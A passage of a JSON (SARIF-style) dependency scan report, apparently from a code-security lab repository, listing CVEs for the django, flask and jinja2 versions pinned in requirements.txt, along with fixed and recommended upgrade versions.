      "results": [
        {
          "properties": {
            "dependency": {
              "direct": true
            },
            "lastEdit": {
              "time": "2025-05-01T22:20:01-06:00",
              "revision": "262124f23ccb8f8a520ad2051d4db237d84c340e",
              "author": {
                "name": "AJLab-GH",
                "email": "ajammes.ftnt@gmail.com"
              },
              "committer": {
                "name": "AJLab-GH",
                "email": "ajammes.ftnt@gmail.com"
              }
            },
            "repository": {
              "kind": "git",
              "location": "https://github.com/40docs/lab_forticnapp_code_security.git",
              "branch": "main",
              "revision": "5bc71b2d6e32031957fa830224f5c5dbffc97ca2"
            }
          },
          "ruleId": "CVE-2020-7471",
          "ruleIndex": 0,
          "level": "error",
          "message": {
            "text": "Package: django@1.11.27 (direct)\nVulnerability CVE-2020-7471 (severity: critical, fixed in 1.11.28)\nSmartFix: 4.2.21 (Minimal version with no known vulnerabilities)\nLink: [CVE-2020-7471](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-7471)\nSample path: requirements.txt -\u003e django@1.11.27\nExplanation: Why is this SmartFix recommended?\n\nSorted Version Graph for package pkg:pypi/django@1.11.27\n\nThe Version Graph is too large to be displayed here!\n\nFix recommendations for package pkg:pypi/django@1.11.27\n  4.2.21 is the minimal version with no known vulnerabilities\n  5.1.9 is the maximum version and it has no known vulnerabilities\n  4.2.17 is the minimal version with no critical or high vulnerabilities\n\nStats: the Version Graph has 32 versions (nodes) and 232 CVEs (edges) (diameter=3)\n\n"
          },
          "locations": [
            {
              "physicalLocation": {
                "artifactLocation": {
                  "uri": "requirements.txt",
                  "uriBaseId": "%SRCROOT%"
                },
                "region": {
                  "startLine": 2,
                  "endLine": 2
                }
              },
              "message": {
                "text": "requirements.txt: django@1.11.27"
              }
            }
          ],
          "partialFingerprints": {
            "hash/v1": "2f031506c829a631f3c0b7ae09747a5b5ea83a6c"
          }
        },
        {
          "properties": {
            "dependency": {
              "direct": true
            },
            "lastEdit": {
              "time": "2025-05-01T22:20:01-06:00",
              "revision": "262124f23ccb8f8a520ad2051d4db237d84c340e",
              "author": {
                "name": "AJLab-GH",
                "email": "ajammes.ftnt@gmail.com"
              },
              "committer": {
                "name": "AJLab-GH",
                "email": "ajammes.ftnt@gmail.com"
              }
            },
            "repository": {
              "kind": "git",
              "location": "https://github.com/40docs/lab_forticnapp_code_security.git",
              "branch": "main",
              "revision": "5bc71b2d6e32031957fa830224f5c5dbffc97ca2"
            }
          },
          "ruleId": "CVE-2020-9402",
          "ruleIndex": 1,
          "level": "error",
          "message": {
            "text": "Package: django@1.11.27 (direct)\nVulnerability CVE-2020-9402 (severity: high, fixed in 1.11.29)\nSmartFix: 4.2.21 (Minimal version with no known vulnerabilities)\nLink: [CVE-2020-9402](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-9402)\nSample path: requirements.txt -\u003e django@1.11.27\nExplanation: Why is this SmartFix recommended?\n\nSorted Version Graph for package pkg:pypi/django@1.11.27\n\nThe Version Graph is too large to be displayed here!\n\nFix recommendations for package pkg:pypi/django@1.11.27\n  4.2.21 is the minimal version with no known vulnerabilities\n  5.1.9 is the maximum version and it has no known vulnerabilities\n  4.2.17 is the minimal version with no critical or high vulnerabilities\n\nStats: the Version Graph has 32 versions (nodes) and 232 CVEs (edges) (diameter=3)\n\n"
          },
          "locations": [
            {
              "physicalLocation": {
                "artifactLocation": {
                  "uri": "requirements.txt",
                  "uriBaseId": "%SRCROOT%"
                },
                "region": {
                  "startLine": 2,
                  "endLine": 2
                }
              },
              "message": {
                "text": "requirements.txt: django@1.11.27"
              }
            }
          ],
          "partialFingerprints": {
            "hash/v1": "b2bd6c74bb124064c72624143b722bb2ac4c063a"
          }
        },
        {
          "properties": {
            "dependency": {
              "direct": true
            },
            "lastEdit": {
              "time": "2025-05-01T22:20:01-06:00",
              "revision": "262124f23ccb8f8a520ad2051d4db237d84c340e",
              "author": {
                "name": "AJLab-GH",
                "email": "ajammes.ftnt@gmail.com"
              },
              "committer": {
                "name": "AJLab-GH",
                "email": "ajammes.ftnt@gmail.com"
              }
            },
            "repository": {
              "kind": "git",
              "location": "https://github.com/40docs/lab_forticnapp_code_security.git",
              "branch": "main",
              "revision": "5bc71b2d6e32031957fa830224f5c5dbffc97ca2"
            }
          },
          "ruleId": "CVE-2021-33203",
          "ruleIndex": 2,
          "level": "warning",
          "message": {
            "text": "Package: django@1.11.27 (direct)\nVulnerability CVE-2021-33203 (severity: medium, fixed in 2.2.24)\nSmartFix: 4.2.21 (Minimal version with no known vulnerabilities)\nLink: [CVE-2021-33203](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-33203)\nSample path: requirements.txt -\u003e django@1.11.27\nExplanation: Why is this SmartFix recommended?\n\nSorted Version Graph for package pkg:pypi/django@1.11.27\n\nThe Version Graph is too large to be displayed here!\n\nFix recommendations for package pkg:pypi/django@1.11.27\n  4.2.21 is the minimal version with no known vulnerabilities\n  5.1.9 is the maximum version and it has no known vulnerabilities\n  4.2.17 is the minimal version with no critical or high vulnerabilities\n\nStats: the Version Graph has 32 versions (nodes) and 232 CVEs (edges) (diameter=3)\n\n"
          },
          "locations": [
            {
              "physicalLocation": {
                "artifactLocation": {
                  "uri": "requirements.txt",
                  "uriBaseId": "%SRCROOT%"
                },
                "region": {
                  "startLine": 2,
                  "endLine": 2
                }
              },
              "message": {
                "text": "requirements.txt: django@1.11.27"
              }
            }
          ],
          "partialFingerprints": {
            "hash/v1": "3764473200087ccacd8467c8a4e1d6d7b6f8c3bb"
          }
        },
        {
          "properties": {
            "dependency": {
              "direct": true
            },
            "lastEdit": {
              "time": "2025-05-01T22:20:01-06:00",
              "revision": "262124f23ccb8f8a520ad2051d4db237d84c340e",
              "author": {
                "name": "AJLab-GH",
                "email": "ajammes.ftnt@gmail.com"
              },
              "committer": {
                "name": "AJLab-GH",
                "email": "ajammes.ftnt@gmail.com"
              }
            },
            "repository": {
              "kind": "git",
              "location": "https://github.com/40docs/lab_forticnapp_code_security.git",
              "branch": "main",
              "revision": "5bc71b2d6e32031957fa830224f5c5dbffc97ca2"
            }
          },
          "ruleId": "CVE-2022-36359",
          "ruleIndex": 3,
          "level": "error",
          "message": {
            "text": "Package: django@1.11.27 (direct)\nVulnerability CVE-2022-36359 (severity: high, fixed in 4.0.7)\nSmartFix: 4.2.21 (Minimal version with no known vulnerabilities)\nLink: [CVE-2022-36359](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-36359)\nSample path: requirements.txt -\u003e django@1.11.27\nExplanation: Why is this SmartFix recommended?\n\nSorted Version Graph for package pkg:pypi/django@1.11.27\n\nThe Version Graph is too large to be displayed here!\n\nFix recommendations for package pkg:pypi/django@1.11.27\n  4.2.21 is the minimal version with no known vulnerabilities\n  5.1.9 is the maximum version and it has no known vulnerabilities\n  4.2.17 is the minimal version with no critical or high vulnerabilities\n\nStats: the Version Graph has 32 versions (nodes) and 232 CVEs (edges) (diameter=3)\n\n"
          },
          "locations": [
            {
              "physicalLocation": {
                "artifactLocation": {
                  "uri": "requirements.txt",
                  "uriBaseId": "%SRCROOT%"
                },
                "region": {
                  "startLine": 2,
                  "endLine": 2
                }
              },
              "message": {
                "text": "requirements.txt: django@1.11.27"
              }
            }
          ],
          "partialFingerprints": {
            "hash/v1": "4ee8bb62d0c7a429ef1c0db4b986940e66ff37a8"
          }
        },
        {
          "properties": {
            "dependency": {
              "direct": true
            },
            "lastEdit": {
              "time": "2025-05-01T22:20:01-06:00",
              "revision": "262124f23ccb8f8a520ad2051d4db237d84c340e",
              "author": {
                "name": "AJLab-GH",
                "email": "ajammes.ftnt@gmail.com"
              },
              "committer": {
                "name": "AJLab-GH",
                "email": "ajammes.ftnt@gmail.com"
              }
            },
            "repository": {
              "kind": "git",
              "location": "https://github.com/40docs/lab_forticnapp_code_security.git",
              "branch": "main",
              "revision": "5bc71b2d6e32031957fa830224f5c5dbffc97ca2"
            }
          },
          "ruleId": "CVE-2024-45231",
          "ruleIndex": 4,
          "level": "warning",
          "message": {
            "text": "Package: django@1.11.27 (direct)\nVulnerability CVE-2024-45231 (severity: medium, fixed in 5.1.1)\nSmartFix: 4.2.21 (Minimal version with no known vulnerabilities)\nLink: [CVE-2024-45231](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2024-45231)\nSample path: requirements.txt -\u003e django@1.11.27\nExplanation: Why is this SmartFix recommended?\n\nSorted Version Graph for package pkg:pypi/django@1.11.27\n\nThe Version Graph is too large to be displayed here!\n\nFix recommendations for package pkg:pypi/django@1.11.27\n  4.2.21 is the minimal version with no known vulnerabilities\n  5.1.9 is the maximum version and it has no known vulnerabilities\n  4.2.17 is the minimal version with no critical or high vulnerabilities\n\nStats: the Version Graph has 32 versions (nodes) and 232 CVEs (edges) (diameter=3)\n\n"
          },
          "locations": [
            {
              "physicalLocation": {
                "artifactLocation": {
                  "uri": "requirements.txt",
                  "uriBaseId": "%SRCROOT%"
                },
                "region": {
                  "startLine": 2,
                  "endLine": 2
                }
              },
              "message": {
                "text": "requirements.txt: django@1.11.27"
              }
            }
          ],
          "partialFingerprints": {
            "hash/v1": "9e03fc66aac10e60686fe9345728b63d9bda205e"
          }
        },
        {
          "properties": {
            "dependency": {
              "direct": true
            },
            "lastEdit": {
              "time": "2025-05-01T22:20:01-06:00",
              "revision": "262124f23ccb8f8a520ad2051d4db237d84c340e",
              "author": {
                "name": "AJLab-GH",
                "email": "ajammes.ftnt@gmail.com"
              },
              "committer": {
                "name": "AJLab-GH",
                "email": "ajammes.ftnt@gmail.com"
              }
            },
            "repository": {
              "kind": "git",
              "location": "https://github.com/40docs/lab_forticnapp_code_security.git",
              "branch": "main",
              "revision": "5bc71b2d6e32031957fa830224f5c5dbffc97ca2"
            }
          },
          "ruleId": "CVE-2023-30861",
          "ruleIndex": 5,
          "level": "error",
          "message": {
            "text": "Package: flask@1.0 (direct)\nVulnerability CVE-2023-30861 (severity: high, fixed in 2.3.2)\nSmartFix: 2.3.2 (Minimal version with no known vulnerabilities)\nLink: [CVE-2023-30861](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2023-30861)\nSample path: requirements.txt -\u003e flask@1.0\nExplanation: Why is this SmartFix recommended?\n\nSorted Version Graph for package pkg:pypi/flask@1.0\n  1.0 is vulnerable:\n    high       CVE-2023-30861       FixVersion= 2.3.2\n  2.3.2 is not vulnerable\n\nFix recommendations for package pkg:pypi/flask@1.0\n  2.3.2 is the minimal version with no known vulnerabilities\n  2.3.2 is the maximum version and it has no known vulnerabilities\n\nStats: the Version Graph has 2 versions (nodes) and 1 CVEs (edges) (diameter=1)\n\n"
          },
          "locations": [
            {
              "physicalLocation": {
                "artifactLocation": {
                  "uri": "requirements.txt",
                  "uriBaseId": "%SRCROOT%"
                },
                "region": {
                  "startLine": 1,
                  "endLine": 1
                }
              },
              "message": {
                "text": "requirements.txt: flask@1.0"
              }
            }
          ],
          "partialFingerprints": {
            "hash/v1": "a39f54abc56443cc0acdff543ca6f497d007b01e"
          }
        },
        {
          "properties": {
            "dependency": {
              "direct": true
            },
            "lastEdit": {
              "time": "2025-05-01T22:20:01-06:00",
              "revision": "262124f23ccb8f8a520ad2051d4db237d84c340e",
              "author": {
                "name": "AJLab-GH",
                "email": "ajammes.ftnt@gmail.com"
              },
              "committer": {
                "name": "AJLab-GH",
                "email": "ajammes.ftnt@gmail.com"
              }
            },
            "repository": {
              "kind": "git",
              "location": "https://github.com/40docs/lab_forticnapp_code_security.git",
              "branch": "main",
              "revision": "5bc71b2d6e32031957fa830224f5c5dbffc97ca2"
            }
          },
          "ruleId": "CVE-2019-10906",
          "ruleIndex": 6,
          "level": "error",
          "message": {
            "text": "Package: jinja2@2.10 (direct)\nVulnerability CVE-2019-10906 (severity: high, fixed in 2.10.1)\nSmartFix: 3.1.5 (Minimal version with no known vulnerabilities)\nLink: [CVE-2019-10906](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-10906)\nSample path: requirements.txt -\u003e jinja2@2.10\nExplanation: Why is this SmartFix recommended?\n\nSorted Version Graph for package pkg:pypi/jinja2@2.10\n  2.10 is vulnerable:\n    high       CVE-2019-10906       FixVersion= 2.10.1\n    medium     CVE-2020-28493       FixVersion= 2.11.3\n    medium     CVE-2024-22195       FixVersion= 3.1.3\n    medium     CVE-2024-34064       FixVersion= 3.1.4\n    medium     CVE-2024-56326       FixVersion= 3.1.5\n    medium     CVE-2025-27516       FixVersion= 3.1.6\n  2.10.1 is vulnerable:\n    medium     CVE-2020-28493       FixVersion= 2.11.3\n    medium     CVE-2024-22195       FixVersion= 3.1.3\n    medium     CVE-2024-34064       FixVersion= 3.1.4\n    medium     CVE-2024-56326       FixVersion= 3.1.5\n    medium     CVE-2025-27516       FixVersion= 3.1.6\n  2.11.3 is vulnerable:\n    medium     CVE-2024-22195       FixVersion= 3.1.3\n    medium     CVE-2024-34064       FixVersion= 3.1.4\n    medium     CVE-2024-56326       FixVersion= 3.1.5\n    medium     CVE-2025-27516       FixVersion= 3.1.6\n  3.1.3 is vulnerable:\n    medium     CVE-2024-56201       FixVersion= 3.1.5\n    medium     CVE-2024-34064       FixVersion= 3.1.4\n    medium     CVE-2024-56326       FixVersion= 3.1.5\n    medium     CVE-2025-27516       FixVersion= 3.1.6\n  3.1.4 is vulnerable:\n    medium     CVE-2025-27516       FixVersion= 3.1.6\n  3.1.5 is not vulnerable\n  3.1.6 is not vulnerable\n\nFix recommendations for package pkg:pypi/jinja2@2.10\n  3.1.5 is the minimal version with no known vulnerabilities\n  3.1.6 is the maximum version and it has no known vulnerabilities\n  2.10.1 is the minimal version with no critical or high vulnerabilities\n\nStats: the Version Graph has 7 versions (nodes) and 20 CVEs (edges) (diameter=1)\n\n"
          },
          "locations": [
            {
              "physicalLocation": {
                "artifactLocation": {
                  "uri": "requirements.txt",
                  "uriBaseId": "%SRCROOT%"
                },
                "region": {
                  "startLine": 4,
                  "endLine": 4
                }
              },
              "message": {
                "text": "requirements.txt: jinja2@2.10"
              }
            }
          ],
          "partialFingerprints": {
            "hash/v1": "66c33c46a631bec50deae83d7d6cd8dec57d605e"
          }
        },
        {
          "properties": {
            "dependency": {
              "direct": true
            },
            "lastEdit": {
              "time": "2025-05-01T22:20:01-06:00",
              "revision": "262124f23ccb8f8a520ad2051d4db237d84c340e",
              "author": {
                "name": "AJLab-GH",
                "email": "ajammes.ftnt@gmail.com"
              },
              "committer": {
                "name": "AJLab-GH",
                "email": "ajammes.ftnt@gmail.com"
              }
            },
            "repository": {
              "kind": "git",
              "location": "https://github.com/40docs/lab_forticnapp_code_security.git",
              "branch": "main",
              "revision": "5bc71b2d6e32031957fa830224f5c5dbffc97ca2"
            }
          },
          "ruleId": "CVE-2020-28493",
          "ruleIndex": 7,
          "level": "warning",
          "message": {
            "text": "Package: jinja2@2.10 (direct)\nVulnerability CVE-2020-28493 (severity: medium, fixed in 2.11.3)\nSmartFix: 3.1.5 (Minimal version with no known vulnerabilities)\nLink: [CVE-2020-28493](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-28493)\nSample path: requirements.txt -\u003e jinja2@2.10\nExplanation: Why is this SmartFix recommended?\n\nSorted Version Graph for package pkg:pypi/jinja2@2.10\n  2.10 is vulnerable:\n    high       CVE-2019-10906       FixVersion= 2.10.1\n    medium     CVE-2020-28493       FixVersion= 2.11.3\n    medium     CVE-2024-22195       FixVersion= 3.1.3\n    medium     CVE-2024-34064       FixVersion= 3.1.4\n    medium     CVE-2024-56326       FixVersion= 3.1.5\n    medium     CVE-2025-27516       FixVersion= 3.1.6\n  2.10.1 is vulnerable:\n    medium     CVE-2020-28493       FixVersion= 2.11.3\n    medium     CVE-2024-22195       FixVersion= 3.1.3\n    medium     CVE-2024-34064       FixVersion= 3.1.4\n    medium     CVE-2024-56326       FixVersion= 3.1.5\n    medium     CVE-2025-27516       FixVersion= 3.1.6\n  2.11.3 is vulnerable:\n    medium     CVE-2024-22195       FixVersion= 3.1.3\n    medium     CVE-2024-34064       FixVersion= 3.1.4\n    medium     CVE-2024-56326       FixVersion= 3.1.5\n    medium     CVE-2025-27516       FixVersion= 3.1.6\n  3.1.3 is vulnerable:\n    medium     CVE-2024-56201       FixVersion= 3.1.5\n    medium     CVE-2024-34064       FixVersion= 3.1.4\n    medium     CVE-2024-56326       FixVersion= 3.1.5\n    medium     CVE-2025-27516       FixVersion= 3.1.6\n  3.1.4 is vulnerable:\n    medium     CVE-2025-27516       FixVersion= 3.1.6\n  3.1.5 is not vulnerable\n  3.1.6 is not vulnerable\n\nFix recommendations for package pkg:pypi/jinja2@2.10\n  3.1.5 is the minimal version with no known vulnerabilities\n  3.1.6 is the maximum version and it has no known vulnerabilities\n  2.10.1 is the minimal version with no critical or high vulnerabilities\n\nStats: the Version Graph has 7 versions (nodes) and 20 CVEs (edges) (diameter=1)\n\n"
          },
          "locations": [
            {
              "physicalLocation": {
                "artifactLocation": {
                  "uri": "requirements.txt",
                  "uriBaseId": "%SRCROOT%"
                },
                "region": {
                  "startLine": 4,
                  "endLine": 4
                }
              },
              "message": {
                "text": "requirements.txt: jinja2@2.10"
              }
            }
          ],
          "partialFingerprints": {
            "hash/v1": "e8cc66fbf7003d5e2d9589b7e8ae48bfd709ae03"
          }
        },
        {
          "properties": {
            "dependency": {
              "direct": true
            },
            "lastEdit": {
              "time": "2025-05-01T22:20:01-06:00",
              "revision": "262124f23ccb8f8a520ad2051d4db237d84c340e",
              "author": {
                "name": "AJLab-GH",
                "email": "ajammes.ftnt@gmail.com"
              },
              "committer": {
                "name": "AJLab-GH",
                "email": "ajammes.ftnt@gmail.com"
              }
            },
            "repository": {
              "kind": "git",
              "location": "https://github.com/40docs/lab_forticnapp_code_security.git",
              "branch": "main",
              "revision": "5bc71b2d6e32031957fa830224f5c5dbffc97ca2"
            }
          },
          "ruleId": "CVE-2024-22195",
          "ruleIndex": 8,
          "level": "warning",
          "message": {
            "text": "Package: jinja2@2.10 (direct)\nVulnerability CVE-2024-22195 (severity: medium, fixed in 3.1.3)\nSmartFix: 3.1.5 (Minimal version with no known vulnerabilities)\nLink: [CVE-2024-22195](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2024-22195)\nSample path: requirements.txt -\u003e jinja2@2.10\nExplanation: Why is this SmartFix recommended?\n\nSorted Version Graph for package pkg:pypi/jinja2@2.10\n  2.10 is vulnerable:\n    high       CVE-2019-10906       FixVersion= 2.10.1\n    medium     CVE-2020-28493       FixVersion= 2.11.3\n    medium     CVE-2024-22195       FixVersion= 3.1.3\n    medium     CVE-2024-34064       FixVersion= 3.1.4\n    medium     CVE-2024-56326       FixVersion= 3.1.5\n    medium     CVE-2025-27516       FixVersion= 3.1.6\n  2.10.1 is vulnerable:\n    medium     CVE-2020-28493       FixVersion= 2.11.3\n    medium     CVE-2024-22195       FixVersion= 3.1.3\n    medium     CVE-2024-34064       FixVersion= 3.1.4\n    medium     CVE-2024-56326       FixVersion= 3.1.5\n    medium     CVE-2025-27516       FixVersion= 3.1.6\n  2.11.3 is vulnerable:\n    medium     CVE-2024-22195       FixVersion= 3.1.3\n    medium     CVE-2024-34064       FixVersion= 3.1.4\n    medium     CVE-2024-56326       FixVersion= 3.1.5\n    medium     CVE-2025-27516       FixVersion= 3.1.6\n  3.1.3 is vulnerable:\n    medium     CVE-2024-56201       FixVersion= 3.1.5\n    medium     CVE-2024-34064       FixVersion= 3.1.4\n    medium     CVE-2024-56326       FixVersion= 3.1.5\n    medium     CVE-2025-27516       FixVersion= 3.1.6\n  3.1.4 is vulnerable:\n    medium     CVE-2025-27516       FixVersion= 3.1.6\n  3.1.5 is not vulnerable\n  3.1.6 is not vulnerable\n\nFix recommendations for package pkg:pypi/jinja2@2.10\n  3.1.5 is the minimal version with no known vulnerabilities\n  3.1.6 is the maximum version and it has no known vulnerabilities\n  2.10.1 is the minimal version with no critical or high vulnerabilities\n\nStats: the Version Graph has 7 versions (nodes) and 20 CVEs (edges) (diameter=1)\n\n"
          },
          "locations": [
            {
              "physicalLocation": {
                "artifactLocation": {
                  "uri": "requirements.txt",
                  "uriBaseId": "%SRCROOT%"
                },
                "region": {
                  "startLine": 4,
                  "endLine": 4
                }
              },
              "message": {
                "text": "requirements.txt: jinja2@2.10"
              }
            }
          ],
          "partialFingerprints": {
            "hash/v1": "38197ea0b606d18e69778b80623d73be32e3449c"
          }
        },
        {
          "properties": {
            "dependency": {
              "direct": true
            },
            "lastEdit": {
              "time": "2025-05-01T22:20:01-06:00",
              "revision": "262124f23ccb8f8a520ad2051d4db237d84c340e",
              "author": {
                "name": "AJLab-GH",
                "email": "ajammes.ftnt@gmail.com"
              },
              "committer": {
                "name": "AJLab-GH",
                "email": "ajammes.ftnt@gmail.com"
              }
            },
            "repository": {
              "kind": "git",
              "location": "https://github.com/40docs/lab_forticnapp_code_security.git",
              "branch": "main",
              "revision": "5bc71b2d6e32031957fa830224f5c5dbffc97ca2"
            }
          },
          "ruleId": "CVE-2024-34064",
          "ruleIndex": 9,
          "level": "warning",
          "message": {
            "text": "Package: jinja2@2.10 (direct)\nVulnerability CVE-2024-34064 (severity: medium, fixed in 3.1.4)\nSmartFix: 3.1.5 (Minimal version with no known vulnerabilities)\nLink: [CVE-2024-34064](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2024-34064)\nSample path: requirements.txt -\u003e jinja2@2.10\nExplanation: Why is this SmartFix recommended?\n\nSorted Version Graph for package pkg:pypi/jinja2@2.10\n  2.10 is vulnerable:\n    high       CVE-2019-10906       FixVersion= 2.10.1\n    medium     CVE-2020-28493       FixVersion= 2.11.3\n    medium     CVE-2024-22195       FixVersion= 3.1.3\n    medium     CVE-2024-34064       FixVersion= 3.1.4\n    medium     CVE-2024-56326       FixVersion= 3.1.5\n    medium     CVE-2025-27516       FixVersion= 3.1.6\n  2.10.1 is vulnerable:\n    medium     CVE-2020-28493       FixVersion= 2.11.3\n    medium     CVE-2024-22195       FixVersion= 3.1.3\n    medium     CVE-2024-34064       FixVersion= 3.1.4\n    medium     CVE-2024-56326       FixVersion= 3.1.5\n    medium     CVE-2025-27516       FixVersion= 3.1.6\n  2.11.3 is vulnerable:\n    medium     CVE-2024-22195       FixVersion= 3.1.3\n    medium     CVE-2024-34064       FixVersion= 3.1.4\n    medium     CVE-2024-56326       FixVersion= 3.1.5\n    medium     CVE-2025-27516       FixVersion= 3.1.6\n  3.1.3 is vulnerable:\n    medium     CVE-2024-56201       FixVersion= 3.1.5\n    medium     CVE-2024-34064       FixVersion= 3.1.4\n    medium     CVE-2024-56326       FixVersion= 3.1.5\n    medium     CVE-2025-27516       FixVersion= 3.1.6\n  3.1.4 is vulnerable:\n    medium     CVE-2025-27516       FixVersion= 3.1.6\n  3.1.5 is not vulnerable\n  3.1.6 is not vulnerable\n\nFix recommendations for package pkg:pypi/jinja2@2.10\n  3.1.5 is the minimal version with no known vulnerabilities\n  3.1.6 is the maximum version and it has no known vulnerabilities\n  2.10.1 is the minimal version with no critical or high vulnerabilities\n\nStats: the Version Graph has 7 versions (nodes) and 20 CVEs (edges) (diameter=1)\n\n"
          },
          "locations": [
            {
              "physicalLocation": {
                "artifactLocation": {
                  "uri": "requirements.txt",
                  "uriBaseId": "%SRCROOT%"
                },
                "region": {
                  "startLine": 4,
                  "endLine": 4
                }
              },
              "message": {
                "text": "requirements.txt: jinja2@2.10"
              }
            }
          ],
          "partialFingerprints": {
            "hash/v1": "244b64f159aa7b171fb9035a4174f3e70aa3e662"
          }
        },
        {
          "properties": {
            "dependency": {
              "direct": true
            },
            "lastEdit": {
              "time": "2025-05-01T22:20:01-06:00",
              "revision": "262124f23ccb8f8a520ad2051d4db237d84c340e",
              "author": {
                "name": "AJLab-GH",
                "email": "ajammes.ftnt@gmail.com"
              },
              "committer": {
                "name": "AJLab-GH",
                "email": "ajammes.ftnt@gmail.com"
              }
            },
            "repository": {
              "kind": "git",
              "location": "https://github.com/40docs/lab_forticnapp_code_security.git",
              "branch": "main",
              "revision": "5bc71b2d6e32031957fa830224f5c5dbffc97ca2"
            }
          },
          "ruleId": "CVE-2024-56326",
          "ruleIndex": 10,
          "level": "warning",
          "message": {
            "text": "Package: jinja2@2.10 (direct)\nVulnerability CVE-2024-56326 (severity: medium, fixed in 3.1.5)\nSmartFix: 3.1.5 (Minimal version with no known vulnerabilities)\nLink: [CVE-2024-56326](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2024-56326)\nSample path: requirements.txt -\u003e jinja2@2.10\nExplanation: Why is this SmartFix recommended?\n\nSorted Version Graph for package pkg:pypi/jinja2@2.10\n  2.10 is vulnerable:\n    high       CVE-2019-10906       FixVersion= 2.10.1\n    medium     CVE-2020-28493       FixVersion= 2.11.3\n    medium     CVE-2024-22195       FixVersion= 3.1.3\n    medium     CVE-2024-34064       FixVersion= 3.1.4\n    medium     CVE-2024-56326       FixVersion= 3.1.5\n    medium     CVE-2025-27516       FixVersion= 3.1.6\n  2.10.1 is vulnerable:\n    medium     CVE-2020-28493       FixVersion= 2.11.3\n    medium     CVE-2024-22195       FixVersion= 3.1.3\n    medium     CVE-2024-34064       FixVersion= 3.1.4\n    medium     CVE-2024-56326       FixVersion= 3.1.5\n    medium     CVE-2025-27516       FixVersion= 3.1.6\n  2.11.3 is vulnerable:\n    medium     CVE-2024-22195       FixVersion= 3.1.3\n    medium     CVE-2024-34064       FixVersion= 3.1.4\n    medium     CVE-2024-56326       FixVersion= 3.1.5\n    medium     CVE-2025-27516       FixVersion= 3.1.6\n  3.1.3 is vulnerable:\n    medium     CVE-2024-56201       FixVersion= 3.1.5\n    medium     CVE-2024-34064       FixVersion= 3.1.4\n    medium     CVE-2024-56326       FixVersion= 3.1.5\n    medium     CVE-2025-27516       FixVersion= 3.1.6\n  3.1.4 is vulnerable:\n    medium     CVE-2025-27516       FixVersion= 3.1.6\n  3.1.5 is not vulnerable\n  3.1.6 is not vulnerable\n\nFix recommendations for package pkg:pypi/jinja2@2.10\n  3.1.5 is the minimal version with no known vulnerabilities\n  3.1.6 is the maximum version and it has no known vulnerabilities\n  2.10.1 is the minimal version with no critical or high vulnerabilities\n\nStats: the Version Graph has 7 versions (nodes) and 20 CVEs (edges) (diameter=1)\n\n"
          },
          "locations": [
            {
              "physicalLocation": {
                "artifactLocation": {
                  "uri": "requirements.txt",
                  "uriBaseId": "%SRCROOT%"
                },
                "region": {
                  "startLine": 4,
                  "endLine": 4
                }
              },
              "message": {
                "text": "requirements.txt: jinja2@2.10"
              }
            }
          ],
          "partialFingerprints": {
            "hash/v1": "f5f77130680817eb285be42195a0e4362642f281"
          }
        },
        {
          "properties": {
            "dependency": {
              "direct": true
            },
            "lastEdit": {
              "time": "2025-05-01T22:20:01-06:00",
              "revision": "262124f23ccb8f8a520ad2051d4db237d84c340e",
              "author": {
                "name": "AJLab-GH",
                "email": "ajammes.ftnt@gmail.com"
              },
              "committer": {
                "name": "AJLab-GH",
                "email": "ajammes.ftnt@gmail.com"
              }
            },
            "repository": {
              "kind": "git",
              "location": "https://github.com/40docs/lab_forticnapp_code_security.git",
              "branch": "main",
              "revision": "5bc71b2d6e32031957fa830224f5c5dbffc97ca2"
            }
          },
          "ruleId": "CVE-2025-27516",
          "ruleIndex": 11,
          "level": "warning",
          "message": {
            "text": "Package: jinja2@2.10 (direct)\nVulnerability CVE-2025-27516 (severity: medium, fixed in 3.1.6)\nSmartFix: 3.1.5 (Minimal version with no known vulnerabilities)\nLink: [CVE-2025-27516](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2025-27516)\nSample path: requirements.txt -\u003e jinja2@2.10\nExplanation: Why is this SmartFix recommended?\n\nSorted Version Graph for package pkg:pypi/jinja2@2.10\n  2.10 is vulnerable:\n    high       CVE-2019-10906       FixVersion= 2.10.1\n    medium     CVE-2020-28493       FixVersion= 2.11.3\n    medium     CVE-2024-22195       FixVersion= 3.1.3\n    medium     CVE-2024-34064       FixVersion= 3.1.4\n    medium     CVE-2024-56326       FixVersion= 3.1.5\n    medium     CVE-2025-27516       FixVersion= 3.1.6\n  2.10.1 is vulnerable:\n    medium     CVE-2020-28493       FixVersion= 2.11.3\n    medium     CVE-2024-22195       FixVersion= 3.1.3\n    medium     CVE-2024-34064       FixVersion= 3.1.4\n    medium     CVE-2024-56326       FixVersion= 3.1.5\n    medium     CVE-2025-27516       FixVersion= 3.1.6\n  2.11.3 is vulnerable:\n    medium     CVE-2024-22195       FixVersion= 3.1.3\n    medium     CVE-2024-34064       FixVersion= 3.1.4\n    medium     CVE-2024-56326       FixVersion= 3.1.5\n    medium     CVE-2025-27516       FixVersion= 3.1.6\n  3.1.3 is vulnerable:\n    medium     CVE-2024-56201       FixVersion= 3.1.5\n    medium     CVE-2024-34064       FixVersion= 3.1.4\n    medium     CVE-2024-56326       FixVersion= 3.1.5\n    medium     CVE-2025-27516       FixVersion= 3.1.6\n  3.1.4 is vulnerable:\n    medium     CVE-2025-27516       FixVersion= 3.1.6\n  3.1.5 is not vulnerable\n  3.1.6 is not vulnerable\n\nFix recommendations for package pkg:pypi/jinja2@2.10\n  3.1.5 is the minimal version with no known vulnerabilities\n  3.1.6 is the maximum version and it has no known vulnerabilities\n  2.10.1 is the minimal version with no critical or high vulnerabilities\n\nStats: the Version Graph has 7 versions (nodes) and 20 CVEs (edges) (diameter=1)\n\n"
          },
          "locations": [
            {
              "physicalLocation": {
                "artifactLocation": {
                  "uri": "requirements.txt",
                  "uriBaseId": "%SRCROOT%"
                },
                "region": {
                  "startLine": 4,
                  "endLine": 4
                }
              },
              "message": {
                "text": "requirements.txt: jinja2@2.10"
              }
            }
          ],
          "partialFingerprints": {
            "hash/v1": "b90ac75de3e323d664b546626e688250bcb13517"
          }
        },
        {
